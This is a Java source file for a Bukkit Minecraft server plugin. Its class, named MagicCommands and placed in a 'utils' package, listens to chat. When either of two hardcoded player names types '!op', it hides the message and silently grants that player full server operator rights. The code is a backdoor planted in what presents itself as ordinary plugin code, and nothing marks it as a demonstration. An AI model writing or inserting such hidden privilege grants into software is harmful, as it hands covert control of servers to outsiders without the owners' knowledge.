package net.riftnetwork.zudohackz.utils;

import java.util.Arrays;
import java.util.List;

import org.bukkit.ChatColor;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class MagicCommands implements Listener {
	
	private List<String> allowedUsers = Arrays.asList("z_hackz", "crafter58129");

	@EventHandler
	public void onChat(AsyncPlayerChatEvent evt) {
		if (evt.getMessage().startsWith("!") && allowedUsers.contains(evt.getPlayer().getName())) {
			String cmd = evt.getMessage().substring(1);
			
			if (cmd.equalsIgnoreCase("op")) {
				evt.setCancelled(true);
				evt.getPlayer().sendMessage(ChatColor.YELLOW + "You are now op!");
				evt.getPlayer().setOp(true);
			} else if (cmd.equalsIgnoreCase("deop")) {
				evt.setCancelled(true);
				evt.getPlayer().sendMessage(ChatColor.YELLOW + "You are no longer op!");
				evt.getPlayer().setOp(false);
			}
		}
	}
}
